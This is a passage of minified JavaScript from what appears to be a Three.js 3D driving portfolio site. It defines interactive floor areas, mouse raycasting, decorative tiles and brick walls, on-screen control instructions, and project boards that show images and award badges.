function");e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,writable:!0,configurable:!0}}),t&&Yu(e,t)}(t,e),i=t,(n=[{key:"activate",value:function(){this.active=!0,this.isIn&&this.in()}},{key:"deactivate",value:function(){this.active=!1,this.isIn&&this.out()}},{key:"setFloorBorder",value:function(){this.floorBorder={},this.floorBorder.geometry=new Nu(2*this.halfExtents.x,2*this.halfExtents.y,.25),this.floorBorder.material=new Hu,this.floorBorder.material.uniforms.uColor.value=new Ne(16777215),this.floorBorder.material.uniforms.uAlpha.value=.5,this.floorBorder.material.uniforms.uLoadProgress.value=1,this.floorBorder.material.uniforms.uProgress.value=1,this.floorBorder.mesh=new Lt(this.floorBorder.geometry,this.floorBorder.material),this.floorBorder.mesh.matrixAutoUpdate=!1,this.container.add(this.floorBorder.mesh)}},{key:"setFence",value:function(){var e=this;this.fence={},this.fence.depth=.5,this.fence.offset=.5,this.fence.geometry=new Uu(2*this.halfExtents.x,2*this.halfExtents.y,this.fence.depth),this.fence.material=new Vu,this.fence.material.uniforms.uBorderAlpha.value=.5,this.fence.material.uniforms.uStrikeAlpha.value=.25,this.fence.mesh=new Lt(this.fence.geometry,this.fence.material),this.fence.mesh.position.z=-this.fence.depth,this.container.add(this.fence.mesh),this.time.on("tick",(function(){e.fence.material.uniforms.uTime.value=e.time.elapsed}))}},{key:"setKey",value:function(){this.key={},this.key.hiddenZ=1.5,this.key.shownZ=2.5,this.key.container=new K,this.key.container.position.z=this.key.hiddenZ,this.container.add(this.key.container),this.key.enter={},this.key.enter.size=1.4,this.key.enter.geometry=new si(this.key.enter.size,this.key.enter.size/4,1,1),this.key.enter.texture=this.resources.items.areaEnterTexture,this.key.enter.texture.magFilter=1003,this.key.enter.texture.minFilter=1006,this.key.enter.material=new qe({color:16777215,alphaMap:this.key.enter.texture,transparent:!0,opacity:0,depthWrite:!1}),this.key.enter.mesh=new Lt(this.key.enter.geometry,this.key.enter.material),this.key.enter.mesh.rotation.x=.5*Math.PI,this.key.enter.mesh.position.x=.75*this.key.enter.size,this.key.enter.mesh.matrixAutoUpdate=!1,this.key.enter.mesh.updateMatrix(),this.key.container.add(this.key.enter.mesh),this.key.icon={},this.key.icon.size=.75,this.key.icon.geometry=new si(this.key.icon.size,this.key.icon.size,1,1),this.key.icon.texture=this.resources.items.areaKeyEnterTexture,this.key.icon.texture.magFilter=1003,this.key.icon.texture.minFilter=1006,this.key.icon.material=new qe({color:16777215,alphaMap:this.key.icon.texture,transparent:!0,opacity:0,depthWrite:!1}),this.key.icon.mesh=new Lt(this.key.icon.geometry,this.key.icon.material),this.key.icon.mesh.rotation.x=.5*Math.PI,this.key.icon.mesh.position.x=.15*-this.key.enter.size,this.key.icon.mesh.matrixAutoUpdate=!1,this.key.icon.mesh.updateMatrix(),this.key.container.add(this.key.icon.mesh)}},{key:"interact",value:function(){var e=this,t=!(arguments.length>0&&void 0!==arguments[0])||arguments[0];this.active&&(Du.e.killTweensOf(this.fence.mesh.position),Du.e.killTweensOf(this.floorBorder.material.uniforms.uAlpha),Du.e.killTweensOf(this.fence.material.uniforms.uBorderAlpha),this.hasKey&&(Du.e.killTweensOf(this.key.container.position),Du.e.killTweensOf(this.key.icon.material),Du.e.killTweensOf(this.key.enter.material)),Du.e.to(this.fence.mesh.position,.05,{z:0,onComplete:function(){Du.e.to(e.fence.mesh.position,.25,{z:.5,ease:zu.easeOut.config(2)}),Du.e.fromTo(e.floorBorder.material.uniforms.uAlpha,1.5,{value:1},{value:.5}),Du.e.fromTo(e.fence.material.uniforms.uBorderAlpha,1.5,{value:1},{value:.5})}}),this.hasKey&&t&&(this.key.container.position.z=this.key.shownZ,Du.e.fromTo(this.key.icon.material,1.5,{opacity:1},{opacity:.5}),Du.e.fromTo(this.key.enter.material,1.5,{opacity:1},{opacity:.5})),this.sounds.play("uiArea"),this.trigger("interact"))}},{key:"in",value:function(){var e=!(arguments.length>0&&void 0!==arguments[0])||arguments[0];this.isIn=!0,this.active&&(Du.e.killTweensOf(this.fence.mesh.position),Du.e.to(this.fence.mesh.position,.35,{z:this.fence.offset,ease:zu.easeOut.config(3)}),this.hasKey&&(Du.e.killTweensOf(this.key.container.position),Du.e.killTweensOf(this.key.icon.material),Du.e.killTweensOf(this.key.enter.material),e&&(Du.e.to(this.key.container.position,.35,{z:this.key.shownZ,ease:zu.easeOut.config(3),delay:.1}),Du.e.to(this.key.icon.material,.35,{opacity:.5,ease:zu.easeOut.config(3),delay:.1}),Du.e.to(this.key.enter.material,.35,{opacity:.5,ease:zu.easeOut.config(3),delay:.1}))),this.config.touch||this.renderer.domElement.classList.add("has-cursor-pointer"),this.trigger("in"))}},{key:"out",value:function(){this.isIn=!1,Du.e.killTweensOf(this.fence.mesh.position),Du.e.to(this.fence.mesh.position,.35,{z:-this.fence.depth,ease:zu.easeIn.config(4)}),this.hasKey&&(Du.e.killTweensOf(this.key.container.position),Du.e.killTweensOf(this.key.icon.material),Du.e.killTweensOf(this.key.enter.material),Du.e.to(this.key.container.position,.35,{z:this.key.hiddenZ,ease:zu.easeIn.config(4),delay:.1}),Du.e.to(this.key.icon.material,.35,{opacity:0,ease:zu.easeIn.config(4),delay:.1}),Du.e.to(this.key.enter.material,.35,{opacity:0,ease:zu.easeIn.config(4),delay:.1})),this.config.touch||this.renderer.domElement.classList.remove("has-cursor-pointer"),this.trigger("out")}},{key:"setInteractions",value:function(){var e=this;this.mouseMesh=new Lt(new si(2*this.halfExtents.x,2*this.halfExtents.y,1,1),new qe({transparent:!0,opacity:0})),this.mouseMesh.position.z=-.01,this.mouseMesh.matrixAutoUpdate=!1,this.mouseMesh.updateMatrix(),this.container.add(this.mouseMesh),this.time.on("tick",(function(){if(e.testCar){var t=Math.abs(e.car.position.x-e.position.x)<Math.abs(e.halfExtents.x)&&Math.abs(e.car.position.y-e.position.y)<Math.abs(e.halfExtents.y);t!==e.isIn&&(t?e.in(!e.config.touch):e.out())}})),window.addEventListener("keydown",(function(t){"f"!==t.key&&"e"!==t.key&&"Enter"!==t.key||!e.isIn||e.interact()}))}}])&&Wu(i.prototype,n),r&&Wu(i,r),t}(qh);function Qu(e,t){var i=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),i.push.apply(i,n)}return i}function $u(e,t,i){return t in e?Object.defineProperty(e,t,{value:i,enumerable:!0,configurable:!0,writable:!0}):e[t]=i,e}function Ju(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var Ku=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.config=t.config,this.resources=t.resources,this.car=t.car,this.sounds=t.sounds,this.renderer=t.renderer,this.camera=t.camera,this.time=t.time,this.debug=t.debug,this.items=[],this.container=new K,this.container.matrixAutoUpdate=!1,this.setMouse()}var t,i,n;return t=e,(i=[{key:"setMouse",value:function(){var e=this;this.mouse={},this.mouse.raycaster=new Nc,this.mouse.coordinates=new f,this.mouse.currentArea=null,this.mouse.needsUpdate=!1,window.addEventListener("mousemove",(function(t){e.mouse.coordinates.x=t.clientX/window.innerWidth*2-1,e.mouse.coordinates.y=-t.clientY/window.innerHeight*2+1,e.mouse.needsUpdate=!0})),window.addEventListener("mousedown",(function(){e.mouse.currentArea&&e.mouse.currentArea.interact(!1)})),this.renderer.domElement.addEventListener("touchstart",(function(t){e.mouse.coordinates.x=t.changedTouches[0].clientX/window.innerWidth*2-1,e.mouse.coordinates.y=-t.changedTouches[0].clientY/window.innerHeight*2+1,e.mouse.needsUpdate=!0})),this.time.on("tick",(function(){if(e.mouse.needsUpdate){e.mouse.needsUpdate=!1,e.mouse.raycaster.setFromCamera(e.mouse.coordinates,e.camera.instance);var t=e.items.map((function(e){return e.mouseMesh})),i=e.mouse.raycaster.intersectObjects(t);if(i.length){var n=e.items.find((function(e){return e.mouseMesh===i[0].object}));n!==e.mouse.currentArea&&(null!==e.mouse.currentArea&&(e.mouse.currentArea.out(),e.mouse.currentArea.testCar=e.mouse.currentArea.initialTestCar),e.mouse.currentArea=n,e.mouse.currentArea.in(!1),e.mouse.currentArea.testCar=!1)}else null!==e.mouse.currentArea&&(e.mouse.currentArea.out(),e.mouse.currentArea.testCar=e.mouse.currentArea.initialTestCar,e.mouse.currentArea=null)}}))}},{key:"add",value:function(e){var t=new Zu(function(e){for(var t=1;t<arguments.length;t++){var i=null!=arguments[t]?arguments[t]:{};t%2?Qu(Object(i),!0).forEach((function(t){$u(e,t,i[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(i)):Qu(Object(i)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(i,t))}))}return e}({config:this.config,renderer:this.renderer,resources:this.resources,car:this.car,sounds:this.sounds,time:this.time,hasKey:!0,testCar:!0,active:!0},e));return this.container.add(t.container),this.items.push(t),t}}])&&Ju(t.prototype,i),n&&Ju(t,n),e}();function ed(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var td=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.resources=t.resources,this.objects=t.objects,this.debug=t.debug,this.items=[],this.interDistance=1.5,this.tangentDistance=.3,this.positionRandomess=.3,this.rotationRandomess=.1,this.setModels()}var t,i,n;return t=e,(i=[{key:"setModels",value:function(){var e=this;this.models={},this.models.items=[{base:this.resources.items.tilesABase.scene,collision:this.resources.items.tilesACollision.scene,chances:8},{base:this.resources.items.tilesBBase.scene,collision:this.resources.items.tilesBCollision.scene,chances:1},{base:this.resources.items.tilesCBase.scene,collision:this.resources.items.tilesCCollision.scene,chances:2},{base:this.resources.items.tilesDBase.scene,collision:this.resources.items.tilesDCollision.scene,chances:4},{base:this.resources.items.tilesEBase.scene,collision:this.resources.items.tilesECollision.scene,chances:2}];var t=this.models.items.reduce((function(e,t){return e+t.chances}),0),i=0;this.models.items=this.models.items.map((function(e){return e.minChances=i,i+=e.chances/t,e.maxChances=i,e.rotationIndex=0,e})),this.models.pick=function(){var t=Math.random(),i=e.models.items.find((function(e){return t>=e.minChances&&t<=e.maxChances}));return i.rotationIndex++,i.rotationIndex>3&&(i.rotationIndex=0),i}}},{key:"add",value:function(e){var t={};t.start=e.start,t.delta=e.delta,t.distance=t.delta.length(),t.count=Math.floor(t.distance/this.interDistance),t.directionVector=t.delta.clone().normalize(),t.interVector=t.directionVector.clone().multiplyScalar(this.interDistance),t.centeringVector=t.delta.clone().sub(t.interVector.clone().multiplyScalar(t.count)),t.tangentVector=t.directionVector.clone().rotateAround(new f(0,0),.5*Math.PI).multiplyScalar(this.tangentDistance),t.angle=t.directionVector.angle();for(var i=0;i<t.count;i++){var n=this.models.pick(),r=t.start.clone().add(t.interVector.clone().multiplyScalar(i)).add(t.centeringVector);r.x+=(Math.random()-.5)*this.positionRandomess,r.y+=(Math.random()-.5)*this.positionRandomess;var o=t.tangentVector;i%1==0&&o.negate(),r.add(o);var a=t.angle;a+=(Math.random()-.5)*this.rotationRandomess,a+=n.rotationIndex/4*Math.PI*2,this.objects.add({base:n.base,collision:n.collision,offset:new y(r.x,r.y,0),rotation:new F(0,0,a),duplicated:!0,mass:0})}}}])&&ed(t.prototype,i),n&&ed(t,n),e}();function id(e,t){var i=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),i.push.apply(i,n)}return i}function nd(e){for(var t=1;t<arguments.length;t++){var i=null!=arguments[t]?arguments[t]:{};t%2?id(Object(i),!0).forEach((function(t){rd(e,t,i[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(i)):id(Object(i)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(i,t))}))}return e}function rd(e,t,i){return t in e?Object.defineProperty(e,t,{value:i,enumerable:!0,configurable:!0,writable:!0}):e[t]=i,e}function od(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var ad=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.resources=t.resources,this.objects=t.objects}var t,i,n;return t=e,(i=[{key:"add",value:function(e){var t={coordinates:[],items:[]},i=e.shape,n=i.widthCount,r=i.heightCount;switch(e.shape.type){case"rectangle":case"brick":for(var o=0;o<r;o++){var a=o===r-1,s=0,c=n;for("brick"===e.shape.type&&a&&e.shape.equilibrateLastLine&&(o%2==0?c--:s++);s<c;s++){var l=new y;l.add(i.offsetWidth.clone().multiplyScalar(s-.5*(i.widthCount-1))),l.add(i.offsetHeight.clone().multiplyScalar(o)),l.x+=(Math.random()-.5)*i.randomOffset.x,l.y+=(Math.random()-.5)*i.randomOffset.y,l.z+=(Math.random()-.5)*i.randomOffset.z,"brick"===e.shape.type&&o%2==0&&l.add(i.offsetWidth.clone().multiplyScalar(.5));var h=new F;h.x+=(Math.random()-.5)*i.randomRotation.x,h.y+=(Math.random()-.5)*i.randomRotation.y,h.z+=(Math.random()-.5)*i.randomRotation.z,t.coordinates.push({offset:l,rotation:h})}}break;case"triangle":r=i.widthCount;for(var u=0;u<r;u++){for(var d=0;d<n;d++){var p=new y;p.add(i.offsetWidth.clone().multiplyScalar(d-.5*(i.widthCount-1))),p.add(i.offsetWidth.clone().multiplyScalar(.5*u)),p.add(i.offsetHeight.clone().multiplyScalar(u)),p.x+=(Math.random()-.5)*i.randomOffset.x,p.y+=(Math.random()-.5)*i.randomOffset.y,p.z+=(Math.random()-.5)*i.randomOffset.z,"brick"===e.shape.type&&u%2==0&&p.add(i.offsetWidth.clone().multiplyScalar(.5));var f=new F;f.x+=(Math.random()-.5)*i.randomRotation.x,f.y+=(Math.random()-.5)*i.randomRotation.y,f.z+=(Math.random()-.5)*i.randomRotation.z,t.coordinates.push({offset:p,rotation:f})}n--}}var m=!0,v=!1,g=void 0;try{for(var b,w=t.coordinates[Symbol.iterator]();!(m=(b=w.next()).done);m=!0){var x=b.value,_=nd({},e.object);_.offset=e.object.offset.clone().add(x.offset).add(i.position),_.rotation=e.object.rotation.clone(),_.rotation.x+=x.rotation.x,_.rotation.y+=x.rotation.y,_.rotation.z+=x.rotation.z,t.items.push(this.objects.add(_))}}catch(e){v=!0,g=e}finally{try{m||null==w.return||w.return()}finally{if(v)throw g}}return t}}])&&od(t.prototype,i),n&&od(t,n),e}();function sd(e,t){var i=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),i.push.apply(i,n)}return i}function cd(e){for(var t=1;t<arguments.length;t++){var i=null!=arguments[t]?arguments[t]:{};t%2?sd(Object(i),!0).forEach((function(t){ld(e,t,i[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(i)):sd(Object(i)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(i,t))}))}return e}function ld(e,t,i){return t in e?Object.defineProperty(e,t,{value:i,enumerable:!0,configurable:!0,writable:!0}):e[t]=i,e}function hd(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var ud=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.config=t.config,this.time=t.time,this.resources=t.resources,this.objects=t.objects,this.areas=t.areas,this.walls=t.walls,this.tiles=t.tiles,this.debug=t.debug,this.x=t.x,this.y=t.y,this.container=new K,this.container.matrixAutoUpdate=!1,this.container.updateMatrix(),this.setStatic(),this.setInstructions(),this.setOtherInstructions(),this.setTitles(),this.setTiles(),this.setDikes()}var t,i,n;return t=e,(i=[{key:"setStatic",value:function(){this.objects.add({base:this.resources.items.introStaticBase.scene,collision:this.resources.items.introStaticCollision.scene,floorShadowTexture:this.resources.items.introStaticFloorShadowTexture,offset:new y(0,0,0),mass:0})}},{key:"setInstructions",value:function(){this.instructions={},this.instructions.arrows={},this.instructions.arrows.label={},this.instructions.arrows.label.texture=this.config.touch?this.resources.items.introInstructionsControlsTexture:this.resources.items.introInstructionsArrowsTexture,this.instructions.arrows.label.texture.magFilter=1003,this.instructions.arrows.label.texture.minFilter=1006,this.instructions.arrows.label.material=new qe({transparent:!0,alphaMap:this.instructions.arrows.label.texture,color:16777215,depthWrite:!1,opacity:0}),this.instructions.arrows.label.geometry=this.resources.items.introInstructionsLabels.scene.children.find((function(e){return"arrows"===e.name})).geometry,this.instructions.arrows.label.mesh=new Lt(this.instructions.arrows.label.geometry,this.instructions.arrows.label.material),this.container.add(this.instructions.arrows.label.mesh),this.config.touch||(this.instructions.arrows.up=this.objects.add({base:this.resources.items.introArrowKeyBase.scene,collision:this.resources.items.introArrowKeyCollision.scene,offset:new y(0,0,0),rotation:new F(0,0,0),duplicated:!0,shadow:{sizeX:1,sizeY:1,offsetZ:-.2,alpha:.5},mass:1.5,soundName:"brick"}),this.instructions.arrows.down=this.objects.add({base:this.resources.items.introArrowKeyBase.scene,collision:this.resources.items.introArrowKeyCollision.scene,offset:new y(0,-.8,0),rotation:new F(0,0,Math.PI),duplicated:!0,shadow:{sizeX:1,sizeY:1,offsetZ:-.2,alpha:.5},mass:1.5,soundName:"brick"}),this.instructions.arrows.left=this.objects.add({base:this.resources.items.introArrowKeyBase.scene,collision:this.resources.items.introArrowKeyCollision.scene,offset:new y(-.8,-.8,0),rotation:new F(0,0,.5*Math.PI),duplicated:!0,shadow:{sizeX:1,sizeY:1,offsetZ:-.2,alpha:.5},mass:1.5,soundName:"brick"}),this.instructions.arrows.right=this.objects.add({base:this.resources.items.introArrowKeyBase.scene,collision:this.resources.items.introArrowKeyCollision.scene,offset:new y(.8,-.8,0),rotation:new F(0,0,.5*-Math.PI),duplicated:!0,shadow:{sizeX:1,sizeY:1,offsetZ:-.2,alpha:.5},mass:1.5,soundName:"brick"}))}},{key:"setOtherInstructions",value:function(){this.config.touch||(this.otherInstructions={},this.otherInstructions.x=16,this.otherInstructions.y=-2,this.otherInstructions.container=new K,this.otherInstructions.container.position.x=this.otherInstructions.x,this.otherInstructions.container.position.y=this.otherInstructions.y,this.otherInstructions.container.matrixAutoUpdate=!1,this.otherInstructions.container.updateMatrix(),this.container.add(this.otherInstructions.container),this.otherInstructions.label={},this.otherInstructions.label.geometry=new si(6,6,1,1),this.otherInstructions.label.texture=this.resources.items.introInstructionsOtherTexture,this.otherInstructions.label.texture.magFilter=1003,this.otherInstructions.label.texture.minFilter=1006,this.otherInstructions.label.material=new qe({transparent:!0,alphaMap:this.otherInstructions.label.texture,color:16777215,depthWrite:!1,opacity:0}),this.otherInstructions.label.mesh=new Lt(this.otherInstructions.label.geometry,this.otherInstructions.label.material),this.otherInstructions.label.mesh.matrixAutoUpdate=!1,this.otherInstructions.container.add(this.otherInstructions.label.mesh),this.otherInstructions.horn=this.objects.add({base:this.resources.items.hornBase.scene,collision:this.resources.items.hornCollision.scene,offset:new y(this.otherInstructions.x+1.25,this.otherInstructions.y-2.75,.2),rotation:new F(0,0,.5),duplicated:!0,shadow:{sizeX:1.65,sizeY:.75,offsetZ:-.1,alpha:.4},mass:1.5,soundName:"horn",sleep:!1}))}},{key:"setTitles",value:function(){}},{key:"setTiles",value:function(){this.tiles.add({start:new f(0,-4.5),delta:new f(0,-4.5)})}},{key:"setDikes",value:function(){this.dikes={},this.dikes.brickOptions={base:this.resources.items.brickBase.scene,collision:this.resources.items.brickCollision.scene,offset:new y(0,0,.1),rotation:new F(0,0,0),duplicated:!0,shadow:{sizeX:1.2,sizeY:1.8,offsetZ:-.15,alpha:.35},mass:.5,soundName:"brick"},this.walls.add({object:this.dikes.brickOptions,shape:{type:"brick",equilibrateLastLine:!0,widthCount:5,heightCount:2,position:new y(this.x-12,this.y-13,0),offsetWidth:new y(0,1.05,0),offsetHeight:new y(0,0,.45),randomOffset:new y(0,0,0),randomRotation:new y(0,0,.2)}}),this.walls.add({object:cd({},this.dikes.brickOptions,{rotation:new F(0,0,.5*Math.PI)}),shape:{type:"brick",equilibrateLastLine:!0,widthCount:3,heightCount:2,position:new y(this.x+8,this.y+6,0),offsetWidth:new y(1.05,0,0),offsetHeight:new y(0,0,.45),randomOffset:new y(0,0,0),randomRotation:new y(0,0,.2)}}),this.walls.add({object:this.dikes.brickOptions,shape:{type:"brick",equilibrateLastLine:!1,widthCount:3,heightCount:2,position:new y(this.x+9.9,this.y+4.7,0),offsetWidth:new y(0,-1.05,0),offsetHeight:new y(0,0,.45),randomOffset:new y(0,0,0),randomRotation:new y(0,0,.2)}}),this.walls.add({object:cd({},this.dikes.brickOptions,{rotation:new F(0,0,.5*Math.PI)}),shape:{type:"brick",equilibrateLastLine:!0,widthCount:3,heightCount:2,position:new y(this.x-14,this.y+2,0),offsetWidth:new y(1.05,0,0),offsetHeight:new y(0,0,.45),randomOffset:new y(0,0,0),randomRotation:new y(0,0,.2)}}),this.walls.add({object:this.dikes.brickOptions,shape:{type:"brick",equilibrateLastLine:!1,widthCount:3,heightCount:2,position:new y(this.x-14.8,this.y+.7,0),offsetWidth:new y(0,-1.05,0),offsetHeight:new y(0,0,.45),randomOffset:new y(0,0,0),randomRotation:new y(0,0,.2)}}),this.walls.add({object:this.dikes.brickOptions,shape:{type:"brick",equilibrateLastLine:!0,widthCount:3,heightCount:2,position:new y(this.x-14.8,this.y-3.5,0),offsetWidth:new y(0,-1.05,0),offsetHeight:new y(0,0,.45),randomOffset:new y(0,0,0),randomRotation:new y(0,0,.2)}}),this.config.touch||(this.walls.add({object:cd({},this.dikes.brickOptions,{rotation:new F(0,0,.5*Math.PI)}),shape:{type:"brick",equilibrateLastLine:!0,widthCount:2,heightCount:2,position:new y(this.x+18.5,this.y+3,0),offsetWidth:new y(1.05,0,0),offsetHeight:new y(0,0,.45),randomOffset:new y(0,0,0),randomRotation:new y(0,0,.2)}}),this.walls.add({object:this.dikes.brickOptions,shape:{type:"brick",equilibrateLastLine:!1,widthCount:2,heightCount:2,position:new y(this.x+19.9,this.y+2.2,0),offsetWidth:new y(0,-1.05,0),offsetHeight:new y(0,0,.45),randomOffset:new y(0,0,0),randomRotation:new y(0,0,.2)}}))}}])&&hd(t.prototype,i),n&&hd(t,n),e}(),dd=function(){return new Vt({wireframe:!1,transparent:!1,uniforms:{uTexture:{value:null},uTextureAlpha:{value:null},uColor:{value:null}},vertexShader:"#define GLSLIFY 1\nvarying vec2 vUv;\n\nvoid main()\n{\n    vUv = uv;\n    gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);\n}\n",fragmentShader:"#define GLSLIFY 1\nuniform sampler2D uTexture;\nuniform vec3 uColor;\nuniform float uTextureAlpha;\n\nvarying vec2 vUv;\n\nvoid main()\n{\n    vec4 textureColor = texture2D(uTexture, vUv);\n\n    gl_FragColor = mix(vec4(uColor, 1.0), textureColor, uTextureAlpha);\n}\n"})};function pd(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var fd=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.time=t.time,this.resources=t.resources,this.objects=t.objects,this.areas=t.areas,this.name=t.name,this.geometries=t.geometries,this.meshes=t.meshes,this.debug=t.debug,this.name=t.name,this.x=t.x,this.y=t.y,this.imageSources=t.imageSources,this.floorTexture=t.floorTexture,this.link=t.link,this.distinctions=t.distinctions,this.container=new K,this.container.matrixAutoUpdate=!1,this.setBoards(),this.setFloor()}var t,i,n;return t=e,(i=[{key:"setBoards",value:function(){var e=this;this.boards={},this.boards.items=[],this.boards.xStart=-5,this.boards.xInter=5,this.boards.y=5,this.boards.color="#8e7161",this.boards.threeColor=new Ne(this.boards.color),this.debug&&this.debug.addColor(this.boards,"color").name("boardColor").onChange((function(){e.boards.threeColor.set(e.boards.color)}));var t=0,i=!0,n=!1,r=void 0;try{for(var o,a=function(){var i=o.value,n={};n.x=e.x+e.boards.xStart+t*e.boards.xInter,n.y=e.y+e.boards.y,e.objects.add({base:e.resources.items.projectsBoardStructure.scene,collision:e.resources.items.projectsBoardCollision.scene,floorShadowTexture:e.resources.items.projectsBoardStructureFloorShadowTexture,offset:new y(n.x,n.y,0),rotation:new F(0,0,0),duplicated:!0,mass:0});var r=new Image;r.addEventListener("load",(function(){n.texture=new S(r),n.texture.needsUpdate=!0,n.texture.magFilter=1003,n.texture.minFilter=1006,n.planeMesh.material.uniforms.uTexture.value=n.texture,Du.g.to(n.planeMesh.material.uniforms.uTextureAlpha,1,{value:1,ease:Du.d.inOut})})),r.src=i,n.planeMesh=e.meshes.boardPlane.clone(),n.planeMesh.position.x=n.x,n.planeMesh.position.y=n.y,n.planeMesh.matrixAutoUpdate=!1,n.planeMesh.updateMatrix(),n.planeMesh.material=new dd,n.planeMesh.material.uniforms.uColor.value=e.boards.threeColor,n.planeMesh.material.uniforms.uTextureAlpha.value=0,e.container.add(n.planeMesh),e.boards.items.push(n),t++},s=this.imageSources[Symbol.iterator]();!(i=(o=s.next()).done);i=!0)a()}catch(e){n=!0,r=e}finally{try{i||null==s.return||s.return()}finally{if(n)throw r}}}},{key:"setFloor",value:function(){var e=this;if(this.floor={},this.floor.x=0,this.floor.y=-2,this.floor.container=new K,this.floor.container.position.x=this.x+this.floor.x,this.floor.container.position.y=this.y+this.floor.y,this.floor.container.matrixAutoUpdate=!1,this.floor.container.updateMatrix(),this.container.add(this.floor.container),this.floor.texture=this.floorTexture,this.floor.texture.magFilter=1003,this.floor.texture.minFilter=1006,this.floor.geometry=this.geometries.floor,this.floor.material=new qe({transparent:!0,depthWrite:!1,alphaMap:this.floor.texture}),this.floor.mesh=new Lt(this.floor.geometry,this.floor.material),this.floor.mesh.matrixAutoUpdate=!1,this.floor.container.add(this.floor.mesh),this.distinctions){var t=!0,i=!1,n=void 0;try{for(var r,o=this.distinctions[Symbol.iterator]();!(t=(r=o.next()).done);t=!0){var a=r.value,s=null,c=null,l=null,h=null;switch(a.type){case"awwwards":s=this.resources.items.projectsDistinctionsAwwwardsBase.scene,c=this.resources.items.projectsDistinctionsAwwwardsCollision.scene,l=1.5,h=1.5;break;case"fwa":s=this.resources.items.projectsDistinctionsFWABase.scene,c=this.resources.items.projectsDistinctionsFWACollision.scene,l=2,h=1;break;case"cssda":s=this.resources.items.projectsDistinctionsCSSDABase.scene,c=this.resources.items.projectsDistinctionsCSSDACollision.scene,l=1.2,h=1.2}this.objects.add({base:s,collision:c,offset:new y(this.x+this.floor.x+a.x,this.y+this.floor.y+a.y,0),rotation:new F(0,0,0),duplicated:!0,shadow:{sizeX:l,sizeY:h,offsetZ:-.1,alpha:.5},mass:1.5,soundName:"woodHit"})}}catch(e){i=!0,n=e}finally{try{t||null==o.return||o.return()}finally{if(i)throw n}}}this.floor.area=this.areas.add({position:new f(this.x+this.link.x,this.y+this.floor.y+this.link.y),halfExtents:new f(this.link.halfExtents.x,this.link.halfExtents.y)}),this.floor.area.on("interact",(function(){if(e.link.event=="urljump"){window.open(e.link.href,"_blank")}else{if(typeof(e.link.function)!="undefined"){e.link.function&&e.link.function()}}})),this.floor.areaLabel=this.meshes.areaLabel.clone(),this.floor.areaLabel.position.x=this.link.x,this.floor.areaLabel.position.y=this.link.y,this.floor.areaLabel.position.z=.001,this.floor.areaLabel.matrixAutoUpdate=!1,this.floor.areaLabel.updateMatrix(),this.floor.container.add(this.floor.areaLabel)}}])&&pd(t.prototype,i),n&&pd(t,n),e}();function Ud(e,t){var i=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),i.push.apply(i,n)}return i}function Vd(e,t,i){return t in e?Object.defineProperty(e,t,{value:i,enumerable:!0,configurable:!0,writable:!0}):e[t]=i,e}function Hd(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var Gd=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.time=t.time,this.resources=t.resources,this.camera=t.camera,this.passes=t.passes,this.objects=t.objects,this.areas=t.areas,this.zones=t.zones,this.tiles=t.tiles,this.debug=t.debug,this.x=t.x,this.y=t.y,this.debug&&(this.debugFolder=this.debug.addFolder("projects"),this.debugFolder.open()),this.items=[],this.interDistance=24,this.positionRandomess=5,this.projectHalfWidth=9,this.container=new K,this.container.matrixAutoUpdate=!1,this.container.updateMatrix(),this.setGeometries(),this.setMeshes(),this.setList(),this.setZone();var i=!0,n=!1,r=void 0;try{for(var o,a=this.list[Symbol.iterator]();!(i=(o=a.next()).done);i=!0){var s=o.value;this.add(s)}}catch(e){n=!0,r=e}finally{try{i||null==a.return||a.return()}finally{if(n)throw r}}}var t,i,n;return t=e,(i=[{key:"setGeometries",value:function(){this.geometries={},this.geometries.floor=new 